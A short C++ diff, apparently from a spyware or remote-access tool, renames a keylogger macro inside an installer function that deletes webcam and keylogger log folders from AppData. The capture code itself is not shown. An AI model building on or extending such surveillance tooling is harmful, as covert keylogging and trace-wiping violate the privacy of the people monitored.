@@ -47,8 +47,8 @@ void Install::deleteLogs(){
     std::filesystem::path webcamLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(WEBCAM)));
     std::filesystem::remove_all(webcamLogsPath);
 #endif
-#ifdef KEYLOGGER
-    std::filesystem::path keyloggerLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(KEYLOGGER)));
+#ifdef KEYLOGGER_DEF
+    std::filesystem::path keyloggerLogsPath(getAppDataPath().append(L"\\"+Converter::string2wstring(KEYLOGGER_DEF)));
     std::filesystem::remove_all(keyloggerLogsPath);
 #endif
 }
